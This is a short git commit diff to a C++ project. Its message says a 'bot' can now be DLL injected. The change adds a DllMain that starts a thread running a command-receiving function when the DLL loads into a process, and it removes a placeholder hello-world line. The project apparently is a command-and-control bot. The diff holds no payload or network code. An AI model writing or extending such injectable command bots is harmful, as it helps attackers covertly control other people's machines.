5b9a28fdac8f2e3c495c7d54f67071ef35ff65a6
Im-Adriano <adrianodecastro1@gmail.com>
2020-04-16 15:59:01 -0400

    Bot now able to be DLL injected

--- Project476.cpp
+++ Project476.cpp
@@ -9,6 +9,29 @@ using namespace std;
 int main()
 {
 	recieve_commands();
-	cout << "Hello CMake." << endl;
 	return 0;
+}
+
+HANDLE thr;
+
+extern "C" __declspec(dllexport) DWORD WINAPI StartMain(LPVOID data) {
+    recieve_commands();
+    return 0;
+}
+
+__declspec(dllexport) BOOL WINAPI DllMain(IN HINSTANCE hModule,
+    IN DWORD  ul_reason_for_call,
+    IN LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        CreateThread(NULL, 0, &StartMain, (LPVOID)NULL, 0, NULL);
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+
+    return TRUE;
 }
--- Project476.h
+++ Project476.h
@@ -1,8 +1,8 @@
-﻿// Project476.h : Include file for standard system include files,
-// or project specific include files.
+﻿
 
 #pragma once
 
 #include <iostream>
+#include "windows.h"
 
-// TODO: Reference additional headers your program requires here.
+
